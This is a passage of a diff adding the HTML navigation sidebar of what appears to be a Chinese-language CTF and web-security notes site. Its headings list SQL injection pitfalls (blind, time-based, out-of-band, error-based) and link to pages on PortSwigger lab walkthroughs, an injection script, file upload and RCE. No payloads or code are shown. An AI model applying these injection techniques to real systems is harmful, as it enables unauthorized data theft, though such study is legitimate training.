+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10oracle-case" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 10（Oracle 专属）：CASE 分支类型不一致
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 10（Oracle 专属）：CASE 分支类型不一致">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-500-500" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 11：分不清「语法错误的 500」和「条件成立的 500」
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 11：分不清「语法错误的 500」和「条件成立的 500」">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12lab-504" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 12：lab 过期了，返回 504
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 12：lab 过期了，返回 504">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_34" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_35" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_36" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13substring-substr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 13：SUBSTRING 和 SUBSTR 混用
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 13：SUBSTRING 和 SUBSTR 混用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_37" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_38" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_39" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#14cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 14：Cookie 里的分隔符和空格
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 14：Cookie 里的分隔符和空格">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_40" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_41" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_42" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 15：盲注逐字符手工试，慢到不可用
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 15：盲注逐字符手工试，慢到不可用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_43" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_44" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_45" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#16-mssql-if-postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 16：把 MSSQL 的 IF 用在 PostgreSQL 上
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 16：把 MSSQL 的 IF 用在 PostgreSQL 上">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_46" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_47" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_48" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#17else-pg_sleep0-else-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 17：ELSE pg_sleep(0) 写成了 ELSE 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 17：ELSE pg_sleep(0) 写成了 ELSE 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_49" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_50" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#18cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 18：Cookie 里的 ; 没编码
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 18：Cookie 里的 ; 没编码">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_53" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_54" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 19：时间盲注用绝对阈值
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 19：时间盲注用绝对阈值">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_55" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_56" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_57" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 20：字符集不含大写字母,静默出错
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 20：字符集不含大写字母,静默出错">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_58" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_59" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_60" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 21：时间盲注开了并发
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 21：时间盲注开了并发">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_61" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_62" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_63" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 22：跑完不验证,不知道错在哪
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 22：跑完不验证,不知道错在哪">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_64" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_65" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-and-cast" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 23：可见错误里 AND 直接接 CAST
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 23：可见错误里 AND 直接接 CAST">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_66" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_67" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_68" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 24：payload 被截断,却以为是语法错
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 24：payload 被截断,却以为是语法错">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_69" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_70" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_71" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#25oob-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 25：OOB payload 里 % 没编码
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 25：OOB payload 里 % 没编码">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_72" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_73" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_74" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#26oob" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 26：OOB 平台在国内打不开
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 26：OOB 平台在国内打不开">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_75" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_76" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_77" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#27-oob-portswigger" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 27：以为换个 OOB 平台就能绕开 PortSwigger 的限制
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 27：以为换个 OOB 平台就能绕开 PortSwigger 的限制">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_78" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_79" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_80" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#28dns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 28：DNS 标签超长 / 含非法字符
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 28：DNS 标签超长 / 含非法字符">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_81" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_82" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_83" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#29sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 29：参数为空，SQL 压根没执行
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 29：参数为空，SQL 压根没执行">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_84" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_85" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_86" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        怎么分辨
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_87" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_88" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        同类前置校验一览
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#30url" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 30：URL 里的 # 是锚点，后面参数全丢
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 30：URL 里的 # 是锚点，后面参数全丢">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_89" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_90" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        验证（原始 TCP，不经任何客户端处理）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_91" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_92" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        为什么浏览器里"好像能用"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_93" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        同源问题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 31：' 前面那个值不是真实用户
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 31：&#39; 前面那个值不是真实用户">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_94" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_95" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_96" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三种写法,三种用途
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_97" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#union-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        顺手记：为什么 UNION 要用 -1'
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#32-31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 32：报错注入只回了 31 个字符，以为数据丢了
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 32：报错注入只回了 31 个字符，以为数据丢了">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_98" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_99" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_100" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 33：没测报错回显，直接闷头做盲注
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 33：没测报错回显，直接闷头做盲注">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_101" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_102" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_103" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法:按这个顺序选打法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_104" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        判断口诀
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_105" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        附：盲注调试的几个「一步到位」检查
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04-%E5%9B%9B%E4%B8%AAlab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    四个 lab 通关记录
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    盲注脚本
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06-OOB%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OOB 带外注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../07-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    报错注入专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blind_sqli_error_%E9%80%90%E8%A1%8C%E8%AE%B2%E8%A7%A3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逐行讲解(盲注脚本)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../upload/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_3" id="__nav_2_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    文件上传
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%93%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../rce/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RCE
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    RCE
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../rce/RCE%E4%B8%93%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RCE 专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../web/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web 通用
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_5" id="__nav_2_5_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web 通用
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/CTF-Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF-Web 学习笔记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../audit/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码审计
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_6" id="__nav_2_6_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    代码审计
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
